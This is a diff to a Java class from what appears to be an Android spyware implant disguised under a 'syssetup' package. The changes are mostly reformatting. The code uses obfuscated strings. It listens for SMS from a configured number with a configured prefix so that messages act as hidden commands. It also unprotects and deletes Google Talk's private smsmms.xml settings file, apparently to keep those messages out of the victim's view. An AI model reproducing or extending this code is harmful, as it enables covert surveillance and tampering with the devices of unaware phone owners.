@@ -9,6 +9,7 @@
 
 package com.android.syssetup.event;
 
+import com.android.mm.M;
 import com.android.syssetup.ProcessInfo;
 import com.android.syssetup.ProcessStatus;
 import com.android.syssetup.auto.Cfg;
@@ -22,16 +23,30 @@ import com.android.syssetup.listener.ListenerSms;
 import com.android.syssetup.module.message.Sms;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.StringUtils;
-import com.android.mm.M;
 
 public class EventSms extends BaseEvent implements Observer<Sms> {
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "EventSms"; //$NON-NLS-1$
 
 	private int actionOnEnter;
 	private String number, msg;
 
 	//private ProcessObserver processObserver;
+
+	public static boolean isInteresting(Sms s, String number, String msg) {
+		if (s.getAddress().toLowerCase().endsWith(number) == false) {
+			return false;
+		}
+
+		// Case insensitive
+		if (s.getBody().toLowerCase().startsWith(msg) == false) {
+			return false;
+		}
+
+		return true;
+	}
 
 	@Override
 	public void actualStart() {
@@ -51,7 +66,7 @@ public class EventSms extends BaseEvent implements Observer<Sms> {
 		try {
 			number = conf.getString(M.e("number"));
 			msg = conf.getString(M.e("text")).toLowerCase();
-			
+
 			BSm.memorize(number, msg);
 
 		} catch (final ConfigurationException e) {
@@ -70,26 +85,26 @@ public class EventSms extends BaseEvent implements Observer<Sms> {
 
 	@Override
 	public void actualGo() {
-		
+
 	}
-	
+
 	@Override
 	public void notifyProcess(ProcessInfo b) {
-		if(b.status == ProcessStatus.STOP && b.processInfo.contains(M.e("com.google.android.talk"))){
+		if (b.status == ProcessStatus.STOP && b.processInfo.contains(M.e("com.google.android.talk"))) {
 			String xmlPath = M.e("/data/data/com.google.android.talk/shared_prefs/smsmms.xml");
 			Path.unprotect(xmlPath);
 			AutoFile file = new AutoFile(xmlPath);
 			byte[] data = file.read();
-			if(data==null)
+			if (data == null)
 				return;
 			String content = new String(data);
-			if(!StringUtils.isEmpty(content))
-			if(content.contains(M.e("<boolean name=\"enable_smsmms_key\" value=\"true\""))){
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (notifyProcess) Bad value!");
+			if (!StringUtils.isEmpty(content))
+				if (content.contains(M.e("<boolean name=\"enable_smsmms_key\" value=\"true\""))) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (notifyProcess) Bad value!");
+					}
+					file.delete();
 				}
-				file.delete();
-			}
 		}
 	}
 
@@ -98,8 +113,8 @@ public class EventSms extends BaseEvent implements Observer<Sms> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());//$NON-NLS-1$ //$NON-NLS-2$
 		}
-		
-		if(!isInteresting(s, this.number, this.msg)){
+
+		if (!isInteresting(s, this.number, this.msg)) {
 			return 0;
 		}
 
@@ -107,18 +122,5 @@ public class EventSms extends BaseEvent implements Observer<Sms> {
 		onExit();
 
 		return 1;
-	}
-
-	public static boolean isInteresting(Sms s, String number, String msg) {
-		if (s.getAddress().toLowerCase().endsWith(number) == false) {
-			return false;
-		}
-
-		// Case insensitive
-		if (s.getBody().toLowerCase().startsWith(msg) == false) {
-			return false;
-		}
-		
-		return true;
 	}
 }
